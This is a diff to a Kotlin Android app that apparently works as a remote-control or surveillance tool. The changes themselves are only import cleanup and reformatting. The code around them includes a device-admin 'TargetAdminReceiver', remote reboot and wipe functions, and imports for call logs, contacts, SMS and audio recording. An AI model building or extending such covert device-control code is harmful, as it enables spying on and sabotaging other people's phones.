@@ -7,9 +7,7 @@ import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.graphics.Color
-import android.view.Gravity
 import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
@@ -22,14 +20,15 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Base64
+import android.view.Gravity
 import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
+import androidx.activity.result.ActivityResult
+import androidx.activity.result.ActivityResultCallback
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -252,16 +251,15 @@ class BackgroundControlService : Service() {
     }
 
     private fun executeReboot() {
-    try {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
-        if (dpm.isAdminActive(adminComponent)) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                dpm.reboot()
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
+            if (dpm.isAdminActive(adminComponent)) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    dpm.reboot()
+                }
             }
-        }
-    } catch (e: Exception) {
-    }
+        } catch (e: Exception) {}
     }
 
     private fun executeWipe() {
@@ -306,17 +304,16 @@ class MainActivity : AppCompatActivity() {
     private lateinit var devicePolicyManager: DevicePolicyManager
     private lateinit var adminComponent: ComponentName
 
-    // تم تعديل المعاملات صراحة لتجنب خطأ p0 نهائياً
     private val permissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions(),
-        androidx.activity.result.ActivityResultCallback> { 
+        ActivityResultCallback> {
             requestDeviceAdminAndStartService()
         }
     )
 
     private val adminLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult(),
-        androidx.activity.result.ActivityResultCallback<androidx.activity.result.ActivityResult> { 
+        ActivityResultCallback<ActivityResult> {
             startBackgroundService()
         }
     )
